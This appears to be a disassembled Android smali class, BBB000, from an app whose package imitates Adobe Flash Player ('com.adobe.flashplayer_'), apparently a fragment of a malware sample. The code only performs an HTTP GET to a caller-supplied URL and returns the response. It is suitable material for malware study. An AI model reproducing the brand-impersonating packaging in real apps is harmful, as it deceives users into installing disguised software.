.class public Lcom/adobe/flashplayer_/BBB000;
.super Landroid/os/AsyncTask;
.source "BBB000.java"


# annotations
.annotation system Ldalvik/annotation/Signature;
    value = {
        "Landroid/os/AsyncTask",
        "<",
        "Ljava/lang/String;",
        "Ljava/lang/String;",
        "Ljava/lang/String;",
        ">;"
    }
.end annotation


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 16
    invoke-direct {p0}, Landroid/os/AsyncTask;-><init>()V

    return-void
.end method


# virtual methods
.method protected bridge varargs synthetic doInBackground([Ljava/lang/Object;)Ljava/lang/Object;
    .locals 1

    .prologue
    .line 1
    check-cast p1, [Ljava/lang/String;

    invoke-virtual {p0, p1}, Lcom/adobe/flashplayer_/BBB000;->doInBackground([Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method protected varargs doInBackground([Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .param p1, "uri"    # [Ljava/lang/String;

    .prologue
    .line 20
    new-instance v0, Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-direct {v0}, Lorg/apache/http/impl/client/DefaultHttpClient;-><init>()V

    .line 22
    .local v0, "httpclient":Lorg/apache/http/client/HttpClient;
    const/4 v3, 0x0

    .line 24
    .local v3, "responseString":Ljava/lang/String;
    :try_start_0
    new-instance v5, Lorg/apache/http/client/methods/HttpGet;

    const/4 v6, 0x0

    aget-object v6, p1, v6

    invoke-direct {v5, v6}, Lorg/apache/http/client/methods/HttpGet;-><init>(Ljava/lang/String;)V

    invoke-interface {v0, v5}, Lorg/apache/http/client/HttpClient;->execute(Lorg/apache/http/client/methods/HttpUriRequest;)Lorg/apache/http/HttpResponse;

    move-result-object v2

    .line 25
    .local v2, "response":Lorg/apache/http/HttpResponse;
    invoke-interface {v2}, Lorg/apache/http/HttpResponse;->getStatusLine()Lorg/apache/http/StatusLine;

    move-result-object v4

    .line 26
    .local v4, "statusLine":Lorg/apache/http/StatusLine;
    invoke-interface {v4}, Lorg/apache/http/StatusLine;->getStatusCode()I

    move-result v5

    const/16 v6, 0xc8

    if-ne v5, v6, :cond_0

    .line 27
    new-instance v1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 28
    .local v1, "out":Ljava/io/ByteArrayOutputStream;
    invoke-interface {v2}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v5

    invoke-interface {v5, v1}, Lorg/apache/http/HttpEntity;->writeTo(Ljava/io/OutputStream;)V

    .line 29
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->close()V

    .line 30
    invoke-virtual {v1}, Ljava/io/ByteArrayOutputStream;->toString()Ljava/lang/String;

    move-result-object v3

    .line 41
    .end local v1    # "out":Ljava/io/ByteArrayOutputStream;
    .end local v2    # "response":Lorg/apache/http/HttpResponse;
    .end local v4    # "statusLine":Lorg/apache/http/StatusLine;
    :goto_0
    return-object v3

    .line 33
    .restart local v2    # "response":Lorg/apache/http/HttpResponse;
    .restart local v4    # "statusLine":Lorg/apache/http/StatusLine;
    :cond_0
    invoke-interface {v2}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v5

    invoke-interface {v5}, Lorg/apache/http/HttpEntity;->getContent()Ljava/io/InputStream;

    move-result-object v5

    invoke-virtual {v5}, Ljava/io/InputStream;->close()V

    .line 34
    new-instance v5, Ljava/io/IOException;

    invoke-interface {v4}, Lorg/apache/http/StatusLine;->getReasonPhrase()Ljava/lang/String;

    move-result-object v6

    invoke-direct {v5, v6}, Ljava/io/IOException;-><init>(Ljava/lang/String;)V

    throw v5
    :try_end_0
    .catch Lorg/apache/http/client/ClientProtocolException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    .line 36
    .end local v2    # "response":Lorg/apache/http/HttpResponse;
    .end local v4    # "statusLine":Lorg/apache/http/StatusLine;
    :catch_0
    move-exception v5

    goto :goto_0

    .line 38
    :catch_1
    move-exception v5

    goto :goto_0
.end method
